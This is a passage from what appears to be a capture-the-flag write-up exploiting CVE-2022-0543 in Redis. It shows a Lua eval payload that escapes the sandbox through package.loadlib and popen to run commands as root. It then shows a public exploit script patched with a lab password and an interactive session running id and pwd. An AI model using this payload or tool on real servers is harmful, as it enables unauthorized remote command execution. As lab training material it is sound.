127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
"uid=0(root) gid=0(root) groups=0(root)\n"

```

The script provides a shell-like experience. It will fail because there’s no auth in the script, but adding this line fixes it:

```

r = redis.Redis(host = ip,port = port, password="F2WHqJUz2WEz=Gqq")

```

Now it works nicely:

```

oxdf@hacky$ python cve-2022-0543.py -h
  
      [#] Create By ::
        _                     _    ___   __   ____                             
       / \   _ __   __ _  ___| |  / _ \ / _| |  _ \  ___ _ __ ___   ___  _ __  
      / _ \ | '_ \ / _` |/ _ \ | | | | | |_  | | | |/ _ \ '_ ` _ \ / _ \| '_ \ 
     / ___ \| | | | (_| |  __/ | | |_| |  _| | |_| |  __/ | | | | | (_) | | | |
    /_/   \_\_| |_|\__, |\___|_|  \___/|_|   |____/ \___|_| |_| |_|\___/|_| |_|
                   |___/            By https://aodsec.com                                           
    
Please input redis ip:
>>127.0.01
Please input redis port:
>>6379
input exec cmd:(q->exit)
>>id
b'uid=0(root) gid=0(root) groups=0(root)\n'
input exec cmd:(q->exit)
>>pwd
b'/var/lib/redis\n'
input exec cmd:(q->exit)

```